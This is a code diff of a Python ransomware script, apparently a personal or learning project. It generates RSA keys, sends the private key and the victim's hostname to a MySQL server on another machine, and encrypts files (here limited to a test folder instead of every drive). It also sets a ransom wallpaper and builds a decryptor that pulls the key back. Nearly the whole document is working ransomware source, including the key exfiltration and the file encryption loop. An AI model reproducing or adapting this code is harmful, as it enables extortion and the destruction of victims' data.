@@ -10,8 +10,6 @@
 # go through encrypted files and decrypt them
 
 # Bonus : Trojan horse
-
-from time import sleep
 from __init__ import encrypt_file
 from key import newkeys
 import win32api
@@ -49,10 +47,10 @@ time = datetime.now()
 publicKey = str(pubkey.n) + "," + str(pubkey.e)
 privateKey = str(privkey.n) + "," + str(privkey.e) + "," + str(privkey.d) + "," + str(privkey.p) + "," + str(privkey.q)
 # connect to the database
-cnx = mysql.connector.connect(user='root', password='',
-                              host='localhost', database='ransomkey')
+cnx = mysql.connector.connect(user='root', password='', host='192.168.1.6', database='ransomkey')
 cursor = cnx.cursor()
 
+input('wait')
 # insert into database
 insert_query = "INSERT INTO ransomkeys (time, hostname, public_key, private_key) VALUES (%s, %s, %s, %s)"
 values = (str(time), str(hostname), str(publicKey), str(privateKey))
@@ -63,12 +61,26 @@ cnx.commit()  # commit the transaction
 cursor.close()
 cnx.close()
 
+input(">")
+
 # ############################ 4- go through the files ################################
 drives = win32api.GetLogicalDriveStrings()
 drives = drives.split('\000')[:-1]
 
-for drive in drives:
-    for dirpath, dirnames, filenames in os.walk(drive):
+# for drive in drives:
+#     for dirpath, dirnames, filenames in os.walk(drive):
+#         for filename in filenames:
+#             if protect_Code_Files(filename) == False:
+#                 file = os.path.join(dirpath, filename)
+#                 try:
+#                     # ############################ 5- encrypt the files ################################
+#                     encrypt_file(file, pubkey)
+#                     print(file)
+#                 except:
+#                     print("can't encrypt the file : " + str(file))
+
+drive = "C:\\Users\\win10\\Desktop\\Test"
+for dirpath, dirnames, filenames in os.walk(drive):
         for filename in filenames:
             if protect_Code_Files(filename) == False:
                 file = os.path.join(dirpath, filename)
@@ -79,28 +91,35 @@ for drive in drives:
                 except:
                     print("can't encrypt the file : " + str(file))
 
+input(">")
 
 # ############################ 6- show encryption screen ################################
-import urllib.request
 import ctypes
 
+# define constants
 SPI_SETDESKWALLPAPER = 20
+SPIF_UPDATEINIFILE = 0x01
+SPIF_SENDWININICHANGE = 0x02
 
-# Replace the URL with the URL of the image you want to set as the desktop background
-image_url = "https://www.stormshield.com/wp-content/uploads/capture-1-4.png"
+# set the path to your desired image file
+image_path = r"C:\\Users\\win10\\Desktop\\pythonProject\\image.png"
 
-# Download the image and save it to a file on your local system
-urllib.request.urlretrieve(image_url, "image.jpg")
+# call the SystemParametersInfo function to set the desktop wallpaper
+ctypes.windll.user32.SystemParametersInfoW(
+    SPI_SETDESKWALLPAPER, 0, image_path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE)
 
-# Call the SystemParametersInfo function from the Windows API to set the desktop background
-ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, "image.jpg", 3)
 
 # ############################ 7- create decryptor program ################################
 import subprocess
 
 program_code = '''
-import win32api
 import os
+import sys
+ 
+# adding Folder_2 to the system path
+sys.path.insert(0, 'C:\\\\Users\\\\win10\\\\Desktop\\\\pythonProject')
+
+import win32api
 from datetime import datetime
 import mysql.connector
 from __init__ import decrypt_file
@@ -113,20 +132,21 @@ def decyptionalgorithme(key):
     # drives = win32api.GetLogicalDriveStrings()
     # drives = drives.split('\000')[:-1]
     
-    for drive in drives:
-        for dirpath, dirnames, filenames in os.walk(drive):
-            for filename in filenames:
-                file = os.path.join(dirpath, filename)
-                try:  # 5- encrypting_files
-                    decrypt_file(file, finalkey) 
-                except:
-                    print("can't decrypt the file : " + str(file))               
+    #for drive in drives:
+    #    for dirpath, dirnames, filenames in os.walk(drive):
+    #        for filename in filenames:
+    #            if protect_Code_Files(filename) == False:
+    #                file = os.path.join(dirpath, filename)
+    #                try:  # 5- encrypting_files
+    #                    decrypt_file(file, finalkey) 
+    #                except:
+    #                    print("can't decrypt the file : " + str(file))               
 
 def decrypt():
     hostname = []
     hostname.append(os.getenv('COMPUTERNAME'))
     cnx = mysql.connector.connect(user='root', password='',
-                               host='localhost', database='ransomkey')
+                               host='192.168.1.6', database='ransomkey')
     cursor = cnx.cursor()
     query = "SELECT private_key FROM ransomkeys where hostname=%s"
     params = (hostname)
@@ -144,6 +164,7 @@ def decrypt():
 decrypt()
 
 '''
+
 program_code = program_code.replace('\0', '')
 program_name = "decryptor.py"
 program_path = f"./{program_name}"
@@ -155,6 +176,6 @@ subprocess.run(f"pyinstaller {program_name} --onefile")
 
 os.remove(program_path)
 
-subprocess.run(f"./dist/{program_name.split('.')[0]}")
+#subprocess.run(f"./dist/{program_name.split('.')[0]}")
 
 # trojan horse : allahou a3lem
